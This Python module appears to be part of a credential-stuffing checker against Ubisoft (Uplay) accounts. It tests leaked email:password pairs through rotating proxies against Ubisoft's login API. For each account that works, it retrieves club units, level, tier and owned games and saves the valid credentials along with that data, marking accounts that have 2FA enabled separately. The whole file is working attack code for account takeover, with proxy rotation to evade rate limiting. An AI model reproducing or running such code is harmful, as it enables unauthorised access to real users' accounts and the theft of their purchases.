from modules.variables import Checker
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
from requests import Session
from base64 import b64encode
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    combo = b64encode(f"{email}:{password}".encode()).decode()
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)
            
            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                
                header_1 = {
                    "Content-Type": "application/json",
                    "Authorization": f"Basic {combo}",
                    "Ubi-AppId": "39baebad-39e5-4552-8c25-2c9b919064e2"
                }
                header_2 = {
                    "authorization": "",
                    "GenomeId": "4f9d4adf-3646-4058-8553-c7b48df556e0",
                    "Ubi-AppId": "39baebad-39e5-4552-8c25-2c9b919064e2"
                }
                data = {"rememberMe":True}
                response = s.post("https://public-ubiservices.ubi.com/v3/profiles/sessions",json=data,headers=header_1)
                if "Invalid credentials" in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "ticket" in response.text or "userId" in response.text:
                    ticket = response.json()["ticket"]
                    user_id = response.json()["userId"]
                    header_2["authorization"] = f"Ubi_v1 t={ticket}"

                    capture = s.get(f"https://public-ubiservices.ubi.com/v1/profiles/club?profileIds={user_id}",headers=header_2).json()[0]
                    units = capture["units"]
                    level = capture["currentLevel"]["levelNumber"]
                    tier = capture["currentLevel"]["tierName"]
                    club_member = capture["isClubMember"]

                    games = []
                    game_list = s.get(f"https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/{user_id}/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN",headers=header_2).json()["ItemList"]
                    for game in game_list:
                        games.append(game["Name"])
                    
                    response = s.get("https://public-ubiservices.ubi.com/v2/profiles/me/2fa",headers=header_2).text
                    if "active\":true" in response:
                        if not Checker.cui:
                            log("custom",":".join([email,password]),"Uplay")
                        save("Uplay","custom",Checker.time,":".join([email,password])+f" | Units: {units} | Level: {level} | Tier: {tier} | Club Member: {club_member} | Total Games: {len(games)} | Games List: {games}")
                        Checker.custom += 1
                        return_proxy(proxy)
                        return
                    else:
                        if not Checker.cui:
                            log("good",":".join([email,password]),"Uplay")
                        save("Uplay","good",Checker.time,":".join([email,password])+f" | Units: {units} | Level: {level} | Tier: {tier} | Club Member: {club_member} | Total Games: {len(games)} | Games List: {games}")
                        Checker.good += 1
                        return_proxy(proxy)
                        return
                else:
                    raise
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        